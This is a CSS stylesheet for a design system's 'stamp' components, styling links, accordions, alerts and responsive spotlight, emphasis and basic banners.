.stamp-link--size-l:active, a.stamp-link--size-l:active { font-family: var(--stamp-text-link-l-pressed-font-family), sans-serif; font-weight: var(--stamp-text-link-l-pressed-font-weight); font-size: var(--stamp-text-link-l-pressed-font-size); line-height: var(--stamp-text-link-l-pressed-line-height); letter-spacing: var(--stamp-text-link-l-pressed-letter-spacing); text-decoration: var(--stamp-text-link-l-pressed-text-decoration); }

.stamp-link--size-l:hover, a.stamp-link--size-l:hover { font-family: var(--stamp-text-link-l-hover-font-family), sans-serif; font-weight: var(--stamp-text-link-l-hover-font-weight); font-size: var(--stamp-text-link-l-hover-font-size); line-height: var(--stamp-text-link-l-hover-line-height); letter-spacing: var(--stamp-text-link-l-hover-letter-spacing); text-decoration: var(--stamp-text-link-l-hover-text-decoration); }

.stamp-cdn-icon { width: 100%; height: 100%; object-fit: contain; }

.stamp-fieldset { border: medium; display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-xl); inline-size: 100%; }

.stamp-fieldset + .stamp-fieldset { margin-block-start: calc(var(--stamp-spacing-inner-3-xl) - var(--stamp-spacing-inner-xl)); }

.stamp-fieldset > legend { margin-bottom: var(--stamp-spacing-inner-xl); }

.stamp-lottie-animation { block-size: 100%; inline-size: 100%; }

.stamp-accordion-item { inline-size: 100%; border-bottom: var(--stamp-border-width-s) solid var(--stamp-color-border-default); border-radius: var(--stamp-radius-xxs); }

.stamp-accordion-item__panel { padding: 0 0 var(--stamp-spacing-inner-l) 0; }

.stamp-accordion-item__header { font-size: var(--stamp-text-heading-xs-font-size); font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); }

.stamp-accordion-item__button { border-block: inherit; border-inline: inherit; border-start-start-radius: inherit; border-start-end-radius: inherit; border-end-start-radius: inherit; border-end-end-radius: inherit; overflow-block: inherit; overflow-inline: inherit; overscroll-behavior-block: inherit; overscroll-behavior-inline: inherit; margin-block: inherit; margin-inline: inherit; scroll-margin-block: inherit; scroll-margin-inline: inherit; padding-block: inherit; padding-inline: inherit; scroll-padding-block: inherit; scroll-padding-inline: inherit; inset-block: inherit; inset-inline: inherit; block-size: inherit; min-block-size: inherit; max-block-size: inherit; min-inline-size: inherit; max-inline-size: inherit; contain-intrinsic-block-size: inherit; contain-intrinsic-inline-size: inherit; background: inherit; background-blend-mode: inherit; border: inherit; border-radius: inherit; box-decoration-break: inherit; -moz-float-edge: inherit; position: inherit; float: inherit; clear: inherit; vertical-align: inherit; baseline-source: inherit; overflow: inherit; overflow-anchor: inherit; transform: inherit; rotate: inherit; scale: inherit; translate: inherit; offset: inherit; scroll-behavior: inherit; scroll-snap-align: inherit; scroll-snap-type: inherit; scroll-snap-stop: inherit; overscroll-behavior: inherit; isolation: inherit; break-after: inherit; break-before: inherit; break-inside: inherit; resize: inherit; perspective: inherit; perspective-origin: inherit; backface-visibility: inherit; transform-box: inherit; transform-style: inherit; transform-origin: inherit; contain: inherit; content-visibility: inherit; container: inherit; appearance: inherit; -moz-orient: inherit; will-change: inherit; shape-image-threshold: inherit; shape-margin: inherit; shape-outside: inherit; touch-action: inherit; -webkit-line-clamp: inherit; scrollbar-gutter: inherit; zoom: inherit; columns: inherit; column-fill: inherit; column-rule: inherit; column-span: inherit; content: inherit; counter-increment: inherit; counter-reset: inherit; counter-set: inherit; opacity: inherit; box-shadow: inherit; clip: inherit; filter: inherit; backdrop-filter: inherit; mix-blend-mode: inherit; font: inherit; font-synthesis: inherit; font-palette: inherit; math-depth: inherit; math-style: inherit; visibility: inherit; writing-mode: inherit; text-orientation: inherit; print-color-adjust: inherit; image-rendering: inherit; image-orientation: inherit; dominant-baseline: inherit; text-anchor: inherit; color-interpolation: inherit; color-interpolation-filters: inherit; fill: inherit; fill-opacity: inherit; fill-rule: inherit; shape-rendering: inherit; stroke: inherit; stroke-width: inherit; stroke-linecap: inherit; stroke-linejoin: inherit; stroke-miterlimit: inherit; stroke-opacity: inherit; stroke-dasharray: inherit; stroke-dashoffset: inherit; clip-rule: inherit; marker: inherit; paint-order: inherit; border-collapse: inherit; empty-cells: inherit; caption-side: inherit; border-spacing: inherit; color: inherit; text-transform: inherit; hyphens: inherit; -moz-text-size-adjust: inherit; text-indent: inherit; overflow-wrap: inherit; word-break: inherit; text-justify: inherit; text-align-last: inherit; text-align: inherit; letter-spacing: inherit; word-spacing: inherit; white-space: inherit; text-shadow: inherit; text-emphasis: inherit; text-emphasis-position: inherit; tab-size: inherit; line-break: inherit; -webkit-text-fill-color: inherit; -webkit-text-stroke: inherit; ruby-align: inherit; ruby-position: inherit; text-combine-upright: inherit; text-rendering: inherit; text-underline-offset: inherit; text-underline-position: inherit; text-decoration-skip-ink: inherit; hyphenate-character: inherit; forced-color-adjust: inherit; -webkit-text-security: inherit; hyphenate-limit-chars: inherit; text-wrap: inherit; pointer-events: inherit; caret-color: inherit; accent-color: inherit; color-scheme: inherit; scrollbar-color: inherit; list-style: inherit; quotes: inherit; margin: inherit; overflow-clip-margin: inherit; scroll-margin: inherit; outline: inherit; outline-offset: inherit; scroll-padding: inherit; page: inherit; inset: inherit; z-index: inherit; flex-flow: inherit; place-content: inherit; justify-items: inherit; flex: inherit; place-self: inherit; order: inherit; height: inherit; min-height: inherit; max-height: inherit; width: inherit; min-width: inherit; max-width: inherit; box-sizing: inherit; object-fit: inherit; object-position: inherit; grid-area: inherit; grid: inherit; aspect-ratio: inherit; contain-intrinsic-size: inherit; vector-effect: inherit; stop-color: inherit; stop-opacity: inherit; flood-color: inherit; flood-opacity: inherit; lighting-color: inherit; mask-type: inherit; clip-path: inherit; mask: inherit; x: inherit; y: inherit; cx: inherit; cy: inherit; rx: inherit; ry: inherit; r: inherit; d: inherit; table-layout: inherit; text-overflow: inherit; text-decoration: inherit; ime-mode: inherit; scrollbar-width: inherit; user-select: inherit; -moz-window-dragging: inherit; -moz-force-broken-image-icon: inherit; transition: inherit; animation: inherit; animation-composition: inherit; -moz-box-align: inherit; -moz-box-direction: inherit; -moz-box-flex: inherit; -moz-box-orient: inherit; -moz-box-pack: inherit; -moz-box-ordinal-group: inherit; display: flex; align-items: center; inline-size: 100%; padding: var(--stamp-spacing-inner-l) 0; cursor: pointer; gap: var(--stamp-spacing-inner-l); }

.stamp-accordion-item__icon { display: flex; align-items: center; justify-content: center; color: var(--stamp-color-icon-default); inline-size: var(--stamp-size-icon-m); block-size: var(--stamp-size-icon-m); }

.stamp-accordion-item__icon--end { margin-right: var(--stamp-spacing-inner-l); margin-left: auto; }

.stamp-accordion-item__button:focus .stamp-accordion-item__icon--end { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); }

.stamp-accordion-item__title { color: var(--stamp-color-text-link-default); }

.stamp-accordion-item__button:focus .stamp-accordion-item__title { color: var(--stamp-color-text-link-default); text-decoration: underline; }

.stamp-accordion-item__button:hover .stamp-accordion-item__title { color: var(--stamp-color-text-link-hover); text-decoration: underline; }

@supports selector(:focus-visible) {
  .stamp-accordion-item__button:focus .stamp-accordion-item__icon--end { outline: none; }
  .stamp-accordion-item__button:focus .stamp-accordion-item__title { text-decoration: none; color: var(--stamp-color-text-link-default); }
  .stamp-accordion-item__button:focus-visible .stamp-accordion-item__icon--end { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-border-width-m); }
  .stamp-accordion-item__button:focus-visible .stamp-accordion-item__title { color: var(--stamp-color-text-link-pressed); text-decoration: underline; }
}

.stamp-alert { display: inline-flex; align-items: flex-start; max-inline-size: 536px; padding: var(--stamp-spacing-inner-l); border-style: solid; border-width: var(--stamp-border-width-s); align-self: flex-start; inline-size: 100%; border-radius: var(--stamp-radius-s); }

.stamp-alert__wrapper { position: relative; z-index: var(--z-index-above); inline-size: fit-content; background-color: var(--stamp-color-background-surface); }

@media (min-width: 400px) {
  .stamp-alert { inline-size: auto; min-inline-size: 300px; }
}

.stamp-alert--primary { border-color: inherit; }

.stamp-alert--secondary { border-color: var(--stamp-color-border-default); background-color: var(--stamp-color-background-surface); }

.stamp-alert--tertiary { border-color: transparent; padding-inline: 0px; }

.stamp-alert--success:not(:not(.stamp-alert--primary)) { border-color: var(--stamp-color-border-positive); background-color: var(--stamp-color-background-positive); }

.stamp-alert--warning:not(:not(.stamp-alert--primary)) { border-color: var(--stamp-color-border-warning); background-color: var(--stamp-color-background-warning); }

.stamp-alert--error:not(:not(.stamp-alert--primary)) { border-color: var(--stamp-color-border-negative); background-color: var(--stamp-color-background-negative); }

.stamp-alert--information:not(:not(.stamp-alert--primary)) { border-color: var(--stamp-color-border-informative); background-color: var(--stamp-color-background-informative); }

.stamp-alert__content { display: flex; flex-direction: column; margin-inline: var(--stamp-spacing-inner-m); flex-grow: 1; }

.stamp-alert__header, .stamp-alert__body, .stamp-alert__footer { word-break: break-word; }

.stamp-alert__body { font-size: var(--stamp-text-body-m-default-font-size); font-weight: var(--stamp-text-body-m-default-font-weight); }

.stamp-alert__icon { display: flex; inline-size: 24px; block-size: 24px; }

.stamp-alert__dismiss-button { cursor: pointer; background-color: transparent; border: medium; color: var(--stamp-color-icon-subtle); }

.stamp-alert__dismiss-button:hover { color: var(--stamp-color-icon-hover); }

.stamp-alert__dismiss-button:active { color: var(--stamp-color-icon-pressed); }

.stamp-alert__dismiss-button:focus { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-border-width-m); }

@supports selector(:focus-visible) {
  .stamp-alert__dismiss-button:focus { outline: none; }
  .stamp-alert__dismiss-button:focus-visible { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-border-width-m); }
}

.stamp-alert__dismiss-icon { display: flex; }

.stamp-alert a { border-radius: var(--stamp-radius-s); }

.stamp-alert a:not(:disabled):focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-alert a:not(:disabled):focus { outline: none; }
  .stamp-alert a:not(:disabled):focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-alert-stack { display: flex; flex-direction: column; border-style: solid; border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-default); border-radius: var(--stamp-radius-s); max-inline-size: 536px; background-color: var(--stamp-color-background-surface); }

.stamp-alert-stack-item { display: flex; gap: var(--stamp-spacing-inner-m); padding: var(--stamp-spacing-inner-m); }

.stamp-alert-stack-item + .stamp-alert-stack-item { border-block-start-style: solid; border-block-start-width: var(--stamp-border-width-s); border-block-start-color: var(--stamp-color-border-default); }

.stamp-alert-stack-item__icon { block-size: var(--stamp-size-icon-m); inline-size: var(--stamp-size-icon-m); }

.stamp-banner-container { inline-size: 100%; block-size: 100%; display: flex; flex-direction: column; align-items: center; padding-inline: var(--stamp-spacing-inner-s); margin-block-end: var(--stamp-spacing-outer-m); }

@media screen and (min-width: 680px) {
  .stamp-banner-container { margin-block-end: 0px; }
}

.stamp-banner-container--primary { background-color: var(--stamp-color-background-brand-subtle); }

.stamp-banner-container--secondary { background-color: var(--stamp-color-background-default); }

.stamp-banner-container__content-wrapper { background-color: var(--stamp-color-background-surface); border-radius: var(--stamp-radius-m); transform: translateY(var(--stamp-spacing-outer-m)); inline-size: 100%; max-inline-size: 532px; text-align: center; }

.stamp-banner-container__content { padding-inline: var(--stamp-spacing-inner-l); padding-block-start: var(--stamp-spacing-inner-3-xl); }

@media screen and (min-width: 680px) {
  .stamp-banner-container__content { padding-inline: var(--stamp-spacing-inner-xxl); }
}

.stamp-banner-container__content-bottom { background-color: var(--stamp-color-background-surface); height: var(--stamp-spacing-outer-m); border-block-width: 0px 1px; border-inline-width: 1px; border-style: solid; border-color: var(--stamp-color-border-default); margin: 0px -1px; border-radius: 0 0 var(--stamp-radius-m) var(--stamp-radius-m); }

.stamp-spotlight-banner { position: relative; z-index: var(--z-index-base); padding-block: var(--stamp-spacing-outer-m) 0; }

.stamp-spotlight-banner--media-type-image { --image-inline-size: 100vw; --image-block-size: auto; --image-max-block-size: 200px; --decoration-offset: 62px; }

.stamp-spotlight-banner--media-type-illustration { --illustration-size: clamp(275px, 50px + 62.5vi, 350px); --illustration-block-padding: 0 var(--stamp-spacing-inner-xl); --decoration-offset: 36px; display: flex; justify-content: space-around; flex-direction: column; min-block-size: var(--illustration-size); }

.stamp-spotlight-banner__content { position: relative; display: grid; grid-template-areas: &quot;header&quot; &quot;body&quot; &quot;footer&quot; &quot;media&quot;; grid-template-rows: repeat(4, auto); grid-template-columns: 100%; }

.stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__content { padding-block: var(--illustration-block-padding); }

.stamp-spotlight-banner__text { margin-inline-end: var(--decoration-offset); }

.stamp-spotlight-banner__header, .stamp-spotlight-banner__body, .stamp-spotlight-banner__footer { display: flex; flex-direction: column; }

.stamp-spotlight-banner__header { grid-area: header; gap: var(--stamp-spacing-inner-s); margin-block-end: var(--stamp-spacing-inner-xxl); }

.stamp-spotlight-banner__body { grid-area: body; margin-block-end: var(--stamp-spacing-inner-xl); }

.stamp-spotlight-banner__footer { grid-area: footer; flex-flow: wrap; align-items: center; column-gap: var(--stamp-spacing-inner-xxl); row-gap: var(--stamp-spacing-inner-xl); margin-block-start: var(--stamp-spacing-inner-xxl); }

.stamp-spotlight-banner__media { grid-area: media; overflow: hidden; }

.stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__media { position: relative; inset-inline: 50%; margin-block-start: var(--stamp-spacing-inner-3-xl); margin-inline: -50vw; inline-size: var(--image-inline-size); block-size: var(--image-block-size); max-block-size: var(--image-max-block-size); }

.stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__media { display: flex; align-items: center; margin-inline: auto; block-size: var(--illustration-size); inline-size: var(--illustration-size); }

.stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__media img, .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__media picture { display: block; inline-size: 100%; block-size: 100%; object-fit: cover; }

.stamp-spotlight-banner__decoration-container { position: absolute; z-index: var(--z-index-below); block-size: var(--decoration-block-size); inline-size: var(--decoration-inline-size); }

.stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__decoration-container { --decoration-block-size: 360px; --decoration-inline-size: 362px; --decoration-stroke-width: 12px; --decoration-rotation: 180deg; inset-inline-start: calc(-115px + 100vw); inset-block-end: 85px; }

.stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__decoration-container { --decoration-block-size: 823px; --decoration-inline-size: 829px; --decoration-stroke-width: 6px; --decoration-rotation: 70deg; inset-inline-end: -567px; inset-block-end: calc((var(--illustration-size) / 2) - 30px); transform: translateX(-50%); }

.stamp-spotlight-banner__decoration { transform: rotate(var(--decoration-rotation)); transform-origin: center center 0px; }

.stamp-spotlight-banner__decoration path { stroke-width: var(--decoration-stroke-width); }

@media (max-width: 479px) {
  .stamp-spotlight-banner--reduced-postline.stamp-spotlight-banner--media-type-image { --decoration-offset: 0; }
  .stamp-spotlight-banner--reduced-postline.stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__decoration-container { display: none; }
}

@media (min-width: 480px) {
  .stamp-spotlight-banner--media-type-image { --decoration-offset: 122px; }
  .stamp-spotlight-banner--media-type-illustration { --illustration-size: clamp(170px, -142px + 65vi, 300px); --illustration-block-padding: var(--stamp-spacing-inner-s) var(--stamp-spacing-inner-xxl); --decoration-offset: 0; }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__content { grid-template-areas: &quot;header media&quot; &quot;body media&quot; &quot;footer media&quot;; grid-template-rows: repeat(3, auto); grid-template-columns: 1fr var(--illustration-size); column-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__header { gap: var(--stamp-spacing-inner-m); margin-block-end: 0px; }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__body, .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__footer { margin-block-start: 0px; }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__header + .stamp-spotlight-banner__body { margin-block-start: var(--stamp-spacing-inner-xl); }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__header + .stamp-spotlight-banner__footer, .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__body + .stamp-spotlight-banner__footer { margin-block-start: var(--stamp-spacing-inner-xxl); }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__media { position: absolute; align-self: center; margin-inline: unset; }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__decoration-container { inset-inline-start: calc(-174px + 100vw); }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__decoration-container { --decoration-block-size: 1087px; --decoration-inline-size: 1100px; --decoration-stroke-width: 4px; --decoration-rotation: 0deg; inset-inline-end: calc((var(--illustration-size) / 2) - 60px); inset-block-end: calc(50% - (var(--decoration-block-size) / 2)); transform: translateX(0px); }
}

@media (min-width: 680px) {
  .stamp-spotlight-banner { padding-block: 0px; }
  .stamp-spotlight-banner--media-type-image { --image-inline-size: 100vw; --image-block-size: 400px; --decoration-offset: 103px; }
  .stamp-spotlight-banner--media-type-illustration { --illustration-size: clamp(250px, 80px + 25vi, 300px); --illustration-block-padding: 0 var(--stamp-spacing-inner-xl); }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__content { grid-template-areas: &quot;header&quot; &quot;body&quot; &quot;footer&quot; &quot;media&quot;; grid-template-rows: repeat(4, auto); grid-template-columns: 100%; }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__content { display: grid; grid-template-areas: &quot;text media&quot;; grid-template-rows: auto; grid-template-columns: minmax(0, 1fr) var(--illustration-size); column-gap: var(--stamp-spacing-inner-3-xl); min-block-size: 324px; }
  .stamp-spotlight-banner__text { padding-block: var(--stamp-spacing-inner-xl); }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__text { grid-area: text; align-self: center; display: flex; flex-direction: column; gap: 0px; }
  .stamp-spotlight-banner__header, .stamp-spotlight-banner__body, .stamp-spotlight-banner__footer { margin-inline-start: var(--stamp-spacing-inner-xl); }
  .stamp-spotlight-banner__header { gap: var(--stamp-spacing-inner-m); margin-block-start: var(--stamp-spacing-outer-m); margin-block-end: var(--stamp-spacing-inner-xxl); }
  .stamp-spotlight-banner__body { margin-block-end: var(--stamp-spacing-inner-xl); }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__media { max-block-size: var(--image-block-size); block-size: var(--image-block-size); inline-size: var(--image-inline-size); }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__media { align-self: center; position: absolute; inset-inline-end: 0px; grid-area: 1 / 2 / -1; margin-inline: unset; }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__decoration-container { --decoration-block-size: 438px; --decoration-inline-size: 441px; --decoration-stroke-width: 11px; inset-inline-start: calc(-190px + 100vw); inset-block-end: calc(var(--image-block-size) - 140px); }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__decoration-container { --decoration-block-size: 1087px; --decoration-inline-size: 1100px; --decoration-stroke-width: 5.25px; --decoration-rotation: 0deg; }
}

@media (min-width: 880px) {
  .stamp-spotlight-banner--media-type-image { --image-offset: 136px; --image-inline-size: auto; --image-block-size: calc(100% + var(--image-offset)); }
  .stamp-spotlight-banner--media-type-illustration { --illustration-size: clamp(340px, -23px + 41.25vi, 505px); --illustration-block-padding: 0 var(--stamp-spacing-inner-xl); min-block-size: unset; }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__content, .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__content { display: grid; grid-template-areas: &quot;text media&quot;; grid-template-rows: auto; column-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__content { grid-template-columns: 58% 42%; min-block-size: 413px; }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__content { grid-template-columns: minmax(0, 1fr) var(--illustration-size); min-block-size: var(--illustration-size); }
  .stamp-spotlight-banner__text { grid-area: text; align-self: center; display: flex; flex-direction: column; gap: 0px; }
  .stamp-spotlight-banner__header { margin-block-start: 0px; }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__media { grid-area: media; align-self: start; position: absolute; inset-inline: unset; inset-block: unset; margin-inline: unset; margin-block: unset; block-size: var(--image-block-size); inline-size: auto; aspect-ratio: 1 / 1; }
  .stamp-spotlight-banner--media-type-image:has(.stamp-spotlight-banner__header + .stamp-spotlight-banner__footer) .stamp-spotlight-banner__header { margin-block-end: 0px; }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__decoration-container { --decoration-block-size: 1236px; --decoration-inline-size: 1242px; --decoration-rotation: 0deg; --decoration-stroke-width: 5px; inset-inline-start: unset; inset-inline-end: 37%; inset-block-start: 50%; inset-block-end: unset; transform: translateY(-50%); }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__decoration-container { --decoration-block-size: 1680px; --decoration-inline-size: 1700px; --decoration-stroke-width: 3.75px; --decoration-rotation: 0deg; inset-inline-end: calc((var(--illustration-size) / 2) - 80px); }
}

@media (min-width: 1024px) {
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__decoration-container { inset-inline-end: calc((var(--illustration-size) / 2) - 100px); }
}

@media (min-width: 1280px) {
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__decoration-container { inset-inline-end: 38%; }
}

.stamp-emphasis-banner { position: relative; z-index: var(--z-index-base); padding-block: var(--stamp-spacing-outer-m); }

.stamp-emphasis-banner--media-type-image { --image-inline-size: 100vw; --image-block-size: auto; }

.stamp-emphasis-banner--media-type-illustration { --illustration-size: clamp(275px, 50px + 62.5vi, 350px); --illustration-block-padding: 0; --decoration-offset: 34px; display: flex; justify-content: space-around; flex-direction: column; min-block-size: var(--illustration-size); }

.stamp-emphasis-banner__content { position: relative; display: grid; grid-template-rows: repeat(4, auto); grid-template-columns: 100%; }

.stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__content { grid-template-areas: &quot;header&quot; &quot;media&quot; &quot;body&quot; &quot;footer&quot;; }

.stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__content { grid-template-areas: &quot;header&quot; &quot;body&quot; &quot;footer&quot; &quot;media&quot;; padding-block: var(--illustration-block-padding); }

.stamp-emphasis-banner__header, .stamp-emphasis-banner__body, .stamp-emphasis-banner__footer { display: flex; flex-direction: column; }

.stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__header, .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__body, .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__footer { margin-inline-end: var(--decoration-offset); }

.stamp-emphasis-banner__header { grid-area: header; gap: var(--stamp-spacing-inner-s); margin-block-end: var(--stamp-spacing-inner-xl); }

.stamp-emphasis-banner__body { grid-area: body; }

.stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__body { margin-block-start: var(--stamp-spacing-inner-xl); }

.stamp-emphasis-banner__footer { grid-area: footer; flex-flow: wrap; align-items: center; column-gap: var(--stamp-spacing-inner-xxl); row-gap: var(--stamp-spacing-inner-xl); margin-block-start: var(--stamp-spacing-inner-xl); }

.stamp-emphasis-banner__media { grid-area: media; overflow: hidden; }

.stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__media { position: relative; inset-inline: 50%; margin-inline: -50vw; inline-size: var(--image-inline-size); block-size: var(--image-block-size); max-block-size: 200px; }

.stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__media { display: flex; align-items: center; margin-inline: auto; block-size: var(--illustration-size); inline-size: var(--illustration-size); }

.stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__media img, .stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__media picture { display: block; inline-size: 100%; block-size: 100%; object-fit: cover; }

.stamp-emphasis-banner__decoration-container { --decoration-block-size: 823px; --decoration-inline-size: 829px; --decoration-stroke-width: 6px; --decoration-rotation: 75deg; position: absolute; z-index: var(--z-index-below); inset-inline-start: 36%; inset-block-end: calc((var(--illustration-size) / 2) - 10px); transform: translateX(-50%); block-size: var(--decoration-block-size); inline-size: var(--decoration-inline-size); }

.stamp-emphasis-banner__decoration { transform-origin: center center 0px; transform: rotate(var(--decoration-rotation)); }

.stamp-emphasis-banner__decoration path { stroke-width: var(--decoration-stroke-width); }

@media (min-width: 480px) {
  .stamp-emphasis-banner--media-type-illustration { --illustration-size: clamp(170px, -142px + 65vi, 300px); --illustration-block-padding: var(--stamp-spacing-inner-s) var(--stamp-spacing-inner-xxl); --decoration-offset: 0; }
  .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__content { grid-template-areas: &quot;header media&quot; &quot;body media&quot; &quot;footer media&quot;; grid-template-rows: repeat(3, auto); grid-template-columns: 1fr var(--illustration-size); column-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__header { gap: var(--stamp-spacing-inner-m); margin-block-end: 0px; }
  .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__body, .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__footer { margin-block-start: 0px; }
  .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__header + .stamp-emphasis-banner__body, .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__header + .stamp-emphasis-banner__footer, .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__body + .stamp-emphasis-banner__footer { margin-block-start: var(--stamp-spacing-inner-xl); }
  .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__media { position: absolute; align-self: center; margin-inline: unset; }
  .stamp-emphasis-banner__decoration-container { --decoration-block-size: 612px; --decoration-inline-size: 620px; --decoration-stroke-width: 7.5px; --decoration-rotation: 145deg; inset-block-end: calc(50% - (var(--decoration-block-size) / 2)); inset-inline-start: calc(100vw - (var(--illustration-size) / 2) - var(--stamp-spacing-outer-m) - 80px); transform: translateX(0px); }
}

@media (min-width: 680px) {
  .stamp-emphasis-banner { padding-block: 0px; }
  .stamp-emphasis-banner--media-type-illustration { --illustration-size: clamp(250px, 80px + 25vi, 300px); --illustration-block-padding: var(--stamp-spacing-inner-s) var(--stamp-spacing-inner-xxl); }
  .stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__content, .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__content { grid-template-areas: &quot;header media&quot; &quot;body media&quot; &quot;footer media&quot;; grid-template-rows: repeat(3, auto); column-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__content { grid-template-columns: repeat(2, 1fr); }
  .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__content { grid-template-columns: 1fr var(--illustration-size); }
  .stamp-emphasis-banner__body, .stamp-emphasis-banner__footer, .stamp-emphasis-banner__header { margin-inline: 0px; }
  .stamp-emphasis-banner__header { gap: var(--stamp-spacing-inner-m); }
  .stamp-emphasis-banner__header { margin-block-start: var(--stamp-spacing-inner-xxl); margin-block-end: 0px; }
  .stamp-emphasis-banner__body { margin-block-start: var(--stamp-spacing-inner-xl); }
  .stamp-emphasis-banner__footer { margin-block-start: var(--stamp-spacing-inner-xxl); }
  .stamp-emphasis-banner:has(.stamp-emphasis-banner__footer) .stamp-emphasis-banner__footer, .stamp-emphasis-banner:not(:has(.stamp-emphasis-banner__footer)) .stamp-emphasis-banner__body { margin-block-end: var(--stamp-spacing-inner-xxl); }
  .stamp-emphasis-banner__media { inset-inline-end: 0px; }
  .stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__media { position: absolute; inset-inline: unset; margin-inline: unset; max-block-size: unset; inline-size: 100vw; block-size: 100%; max-inline-size: 100%; }
  .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__media { position: absolute; align-self: center; margin-inline: unset; }
  .stamp-emphasis-banner__decoration-container { --decoration-block-size: 612px; --decoration-inline-size: 620px; --decoration-stroke-width: 8px; --decoration-rotation: 145deg; inset-inline-start: calc(100vw - (var(--illustration-size) / 2) - var(--stamp-spacing-outer-xl) - 80px); }
}

@media (min-width: 880px) {
  .stamp-emphasis-banner--media-type-illustration { --illustration-size: clamp(315px, -21.6px + 38.25vi, 468px); --illustration-block-padding: 0 var(--stamp-spacing-inner-xl); }
  .stamp-emphasis-banner__decoration-container { --decoration-block-size: clamp(630px, 212px + 47.5vi, 820px); --decoration-inline-size: clamp(640px, 222px + 47.5vi, 830px); --decoration-rotation: -255deg; inset-inline-start: calc(100vw - var(--decoration-inline-size) + (var(--illustration-size) / 2) + 80px); }
}

@media (min-width: 1102px) {
  .stamp-emphasis-banner__decoration-container { inset-inline-start: 1013px; transform: translateX(-50%); }
}

@media (min-width: 1280px) {
  .stamp-emphasis-banner__decoration-container { inset-inline-start: calc(1013px + calc(var(--stamp-spacing-outer-xl) * 2)); }
}

.stamp-basic-banner { padding-block: var(--stamp-spacing-outer-m) var(--stamp-spacing-inner-xxl); }

.stamp-basic-banner__content { position: relative; display: grid; grid-template-areas: &quot;header&quot; &quot;media&quot; &quot;body&quot; &quot;footer&quot;; grid-template-rows: repeat(4, auto); grid-template-columns: 100%; background-color: var(--stamp-color-background-surface); }

.stamp-basic-banner__header, .stamp-basic-banner__body, .stamp-basic-banner__footer { display: flex; flex-direction: column; }

.stamp-basic-banner__header { grid-area: header; gap: var(--stamp-spacing-inner-s); margin-block-end: var(--stamp-spacing-inner-xl); }

